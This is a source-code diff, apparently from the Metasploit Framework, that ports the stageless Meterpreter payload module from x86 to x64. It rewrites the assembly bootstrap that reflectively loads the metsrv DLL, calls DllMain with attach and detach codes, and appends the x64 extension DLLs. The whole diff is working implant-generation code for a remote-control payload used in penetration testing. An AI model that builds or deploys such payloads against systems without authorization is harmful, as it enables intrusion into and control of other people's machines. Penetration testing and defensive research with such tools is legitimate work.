@@ -7,11 +7,11 @@ module Msf
 
 ##
 #
-# Implements stageless invocation of metsrv in x86
+# Implements stageless invocation of metsrv in x64
 #
 ##
 
-module Payload::Windows::StagelessMeterpreter
+module Payload::Windows::StagelessMeterpreter_x64
 
   include Msf::Payload::Windows
   include Msf::Payload::Single
@@ -20,39 +20,39 @@ module Payload::Windows::StagelessMeterpreter
   def asm_invoke_metsrv(opts={})
     asm = %Q^
         ; prologue
-          dec ebp               ; 'M'
-          pop edx               ; 'Z'
-          call $+5              ; call next instruction
-          pop ebx               ; get the current location (+7 bytes)
-          push edx              ; restore edx
-          inc ebp               ; restore ebp
-          push ebp              ; save ebp for later
-          mov ebp, esp          ; set up a new stack frame
+          db 0x4d, 0x5a         ; 'MZ' = "pop r10"
+          push r10              ; back to where we started
+          push rbp              ; save rbp
+          mov rbp, rsp          ; set up a new stack frame
+          sub rsp, 32           ; allocate some space for calls.
+        ; GetPC
+          call $+5              ; relative call to get location
+          pop rbx               ; pop return value
         ; Invoke ReflectiveLoader()
-          ; add the offset to ReflectiveLoader() (0x????????)
-          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
-          call ebx              ; invoke ReflectiveLoader()
+          ; add the offset to ReflectiveLoader()
+          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x11)}
+          call rbx              ; invoke ReflectiveLoader()
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
           ; offset from ReflectiveLoader() to the end of the DLL
-          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
-          push ebx              ; push the pointer to the extension list
-          push 4                ; indicate that we have attached
-          push eax              ; push some arbitrary value for hInstance
-          mov ebx, eax          ; save DllMain for another call
-          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
+          add rbx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
+          mov r8, rbx           ; r8 points to the extension list
+          mov rbx, rax          ; save DllMain for another call
+          push 4                ; push up 4, indicate that we have attached
+          pop rdx               ; pop 4 into rdx
+          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
           ; push the exitfunk value onto the stack
-          push #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
-          push 5                ; indicate that we have detached
-          push eax              ; push some arbitrary value for hInstance
-          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
+          mov r8d, #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
+          push 5                ; push 5, indicate that we have detached
+          pop rdx               ; pop 5 into rdx
+          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
     ^
 
     asm
   end
 
-  def generate_stageless_x86(url = nil)
-    dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x86.dll'))
+  def generate_stageless_x64(url = nil)
+    dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x64.dll'))
 
     conf = {
       :rdi_offset => offset,
@@ -63,11 +63,11 @@ module Payload::Windows::StagelessMeterpreter
     asm = asm_invoke_metsrv(conf)
 
     # generate the bootstrap asm
-    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
+    bootstrap = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
 
     # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
     if bootstrap.length > 62
-      print_error("Stageless Meterpreter generated with oversized x86 bootstrap.")
+      print_error("Stageless Meterpreter generated with oversized x64 bootstrap.")
       return
     end
 
@@ -94,7 +94,7 @@ module Payload::Windows::StagelessMeterpreter
     unless datastore['EXTENSIONS'].nil?
       datastore['EXTENSIONS'].split(',').each do |e|
         e = e.strip.downcase
-        ext, o = load_rdi_dll(MeterpreterBinaries.path("ext_server_#{e}", 'x86.dll'))
+        ext, o = load_rdi_dll(MeterpreterBinaries.path("ext_server_#{e}", 'x64.dll'))
 
         # append the size, offset to RDI and the payload itself
         dll << [ext.length].pack('V') + ext
